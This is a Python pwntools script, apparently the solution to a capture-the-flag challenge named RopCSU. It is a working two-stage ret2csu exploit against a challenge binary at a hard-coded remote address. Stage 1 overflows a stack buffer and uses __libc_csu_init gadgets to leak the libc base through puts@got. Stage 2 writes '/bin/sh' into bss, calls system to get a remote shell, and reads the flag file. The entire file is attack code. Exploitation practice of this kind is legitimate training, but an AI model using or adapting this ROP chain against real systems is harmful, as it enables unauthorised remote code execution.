#!/usr/bin/env python3
"""q2 — RopCSU: two-stage ret2csu exploit.

Stage 1: leak puts@got via __libc_csu_init, return to main.
Stage 2: read("/bin/sh") into bss via csu, then system(bss).
"""
from pwn import *

context.binary = e = ELF("player/chall")
context.log_level = "info"

HOST, PORT = "35.192.106.100", 20002

MAIN = 0x401090
PUTS_PLT, READ_PLT = 0x401064, 0x401074
PUTS_GOT, READ_GOT = 0x404000, 0x404008
POP_RDI = 0x4011ED
CSU_POP, CSU_CALL = 0x4011E4, 0x4011EF
BSS = 0x404060
OFF = 0x58  # main() has no push rbp: frame is sub rsp,0x58 only

libc = ELF("player/libc.so.6")


def csu_call(addr, rdi, rsi, rdx, ret_to):
    return flat([
        CSU_POP, 0, 8, addr, rdi, rsi, rdx,
        CSU_CALL, 0, ret_to,
    ])


def main():
    io = remote(HOST, PORT)
    io.recvuntil(b"pwn it.\n")

    # stage 1: puts(puts@got) -> leak libc
    payload = b"A" * OFF + csu_call(PUTS_GOT, PUTS_GOT, 0, 0, MAIN)
    io.send(payload)
    leak = io.recvline().strip().ljust(8, b"\x00")
    puts_addr = u64(leak[:8])
    libc.address = puts_addr - libc.symbols["puts"]
    log.success("puts @ %#x, libc @ %#x", puts_addr, libc.address)

    io.recvuntil(b"pwn it.\n")
    # stage 2: read(0, bss, 8) then system(bss)
    payload = flat([
        b"A" * OFF,
        CSU_POP, 0, 8, READ_GOT, 0, BSS, 8,
        CSU_CALL, 0,
        POP_RDI, BSS,
        libc.symbols["system"],
    ])
    io.send(payload)
    io.send(b"/bin/sh\x00")
    io.sendline(b"cat /home/ctf/flag.txt")
    print(io.recvall(timeout=3).decode(errors="replace"))


if __name__ == "__main__":
    main()
